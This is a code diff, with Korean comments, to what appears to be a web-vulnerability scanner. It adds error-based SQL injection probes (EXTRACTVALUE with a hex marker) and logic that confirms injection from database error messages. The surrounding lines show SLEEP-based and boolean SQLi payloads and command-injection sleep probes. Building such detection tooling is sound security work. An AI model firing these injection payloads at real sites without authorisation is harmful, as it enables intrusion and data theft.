@@ -40,6 +40,17 @@ _AUTH_FAIL_RE = re.compile(
 # 세션/인증 쿠키 이름 힌트
 _SESSION_COOKIE_RE = re.compile(r"(session|sess|auth|token|jwt|sid|login|connect\.sid)", re.I)
 
+# 에러 기반 SQLi 확증용 고유 마커. EXTRACTVALUE 인자에 hex 로만 넣으므로, 응답에 '평문'
+# 마커가 나오면 DB 가 hex 를 디코딩·평가해 에러 메시지로 되돌린 것 → error-based 확증.
+# (요청에는 hex 만 있고 평문은 없으므로 우연 반사와 구분된다.)
+_SQL_ERR_MARKER = "SQLIQZX7"
+_SQL_ERR_HEX = _SQL_ERR_MARKER.encode().hex()   # 예: 53514c49515a5837
+# 에러 기반이 마커 없이도 'DB 에러 유발' 로 잡히도록 하는 SQL 에러 시그니처(대조엔 없어야 함)
+_SQL_ERROR_RE = re.compile(
+    r"SQL syntax|mysql_fetch|MySQLSyntaxError|ORA-\d{5}|Microsoft SQL Server|"
+    r"PostgreSQL.*ERROR|sqlite3\.OperationalError|ODBC.*Driver|"
+    r"XPATH syntax error|valid MySQL result|Warning.*\Wmysqli?_", re.I)
+
 
 def _norm_cat(category: str) -> str:
     """카테고리 별칭 정규화 — IDOR 페이로드는 'business' 카테고리로 들어온다."""
@@ -71,6 +82,10 @@ def probe_plan(category: str, base_value: str = "") -> list[dict]:
             {"role": "time5n",     "label": "SLEEP(5) 숫자",    "value": f"{b} AND SLEEP(5)-- -"},
             {"role": "bool_true",  "label": "참 조건",          "value": f"{b}' AND '1'='1"},
             {"role": "bool_false", "label": "거짓 조건",        "value": f"{b}' AND '1'='2"},
+            {"role": "err",  "label": "에러 기반(문자열)",
+             "value": f"{b}' AND EXTRACTVALUE(1,CONCAT(0x7e,0x{_SQL_ERR_HEX},0x7e))-- -"},
+            {"role": "errn", "label": "에러 기반(숫자)",
+             "value": f"{b} AND EXTRACTVALUE(1,CONCAT(0x7e,0x{_SQL_ERR_HEX},0x7e))-- -"},
         ]
 
     if cat == "cmdi":
@@ -208,6 +223,28 @@ def decide(category: str, results: list[dict]) -> dict:
                 if len_diff >= _LEN_DELTA_MIN:
                     ev.append(f"본문 길이차 {len_diff}B")
                 techniques.append({"name": "불린 기반 SQLi", "evidence": "; ".join(ev)})
+        # 에러 기반 — EXTRACTVALUE 로 hex 마커를 되돌리게 하고, 응답에 '평문' 마커가 나오면
+        # DB 가 실제로 평가한 것(요청엔 hex 만 있음). 또는 대조엔 없던 SQL 에러가 뜨면 확증.
+        base_body = (by.get("baseline") or {}).get("body") or ""
+        base_has_err = bool(_SQL_ERROR_RE.search(base_body))
+        for role in ("err", "errn"):
+            r = by.get(role)
+            body = (r or {}).get("body") or ""
+            if not r:
+                continue
+            if _SQL_ERR_MARKER in body:
+                techniques.append({
+                    "name": "에러 기반 SQLi (마커 반환)",
+                    "evidence": f"주입한 hex(0x{_SQL_ERR_HEX})가 DB 에러로 '{_SQL_ERR_MARKER}' 평문 반환",
+                })
+                break
+            if not base_has_err and _SQL_ERROR_RE.search(body):
+                m = _SQL_ERROR_RE.search(body)
+                techniques.append({
+                    "name": "에러 기반 SQLi (DB 에러 유발)",
+                    "evidence": f"대조엔 없던 SQL 에러가 주입 시 발생: '{m.group(0)[:60]}'",
+                })
+                break
 
     elif cat == "cmdi":
         for c0, c5, ctx in (("time0", "time5", "; sleep"), ("time0", "time5s", "$(sleep)")):
